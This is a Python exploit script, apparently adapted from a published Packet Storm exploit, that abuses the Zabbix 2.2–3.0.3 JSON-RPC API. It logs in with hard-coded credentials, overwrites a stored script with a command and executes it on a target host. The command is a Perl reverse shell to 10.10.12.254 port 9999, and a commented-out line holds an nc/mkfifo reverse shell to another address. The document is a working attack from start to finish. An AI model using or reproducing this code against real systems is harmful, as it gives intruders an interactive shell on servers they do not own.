#!/usr/bin/env python
# -*- coding: utf-8 -*-
# https://packetstormsecurity.com/files/137454/Zabbix-3.0.3-Remote-Command-Execution.html
# Exploit Title: Zabbix RCE with API JSON-RPC
# Date: 06-06-2016
# Exploit Author: Alexander Gurin
# Vendor Homepage: http://www.zabbix.com
# Software Link: http://www.zabbix.com/download.php
# Version: 2.2 - 3.0.3
# Tested on: Linux (Debian, CentOS)
# CVE : N/A

import requests
import json
import readline

ZABIX_ROOT = 'http://10.10.10.108/zabbix'  ### Zabbix IP-address
url = ZABIX_ROOT + '/api_jsonrpc.php'   ### Don't edit

login = 'zapper'     ### Zabbix login
password = 'zapper' ### Zabbix password
#hostid = '10105'    ### Zabbix hostid
hostid = '10106'

### auth
payload = {
    "jsonrpc" : "2.0",
    "method" : "user.login",
    "params": {
        'user': ""+login+"",
        'password': ""+password+"",
    },
    "auth" : None,
    "id" : 0,
}
headers = {
    'content-type': 'application/json',
}

auth  = requests.post(url, data=json.dumps(payload), headers=(headers))
auth = auth.json()

while True:
    '''
    cmd = raw_input('\033[41m[cmd]>>: \033[0m ')
    if cmd == "" : print "Result of last command:"
    if cmd == "quit" : break
    '''

    cmd = """perl -e 'use Socket;$i="10.10.12.254";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' & """

### update
    payload = {
        "jsonrpc": "2.0",
        "method": "script.update",
        "params": {
            "scriptid": "1",
            "command": ""+cmd+"",
            #"command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.12.204 9999 >/tmp/f", 
            "execute_on":0
        },
        "auth" : auth['result'],
        "id" : 0,
    }

    cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers))
### execute

    payload = {
        "jsonrpc": "2.0",
        "method": "script.execute",
        "params": {
            "scriptid": "1",
            "hostid": ""+hostid+"",
            "execute_on":0
        },
        "auth" : auth['result'],
        "id" : 0,
    }

    cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers))
    cmd_exe = cmd_exe.json()
  
    print cmd_exe
    print cmd_exe["result"]["value"]
    

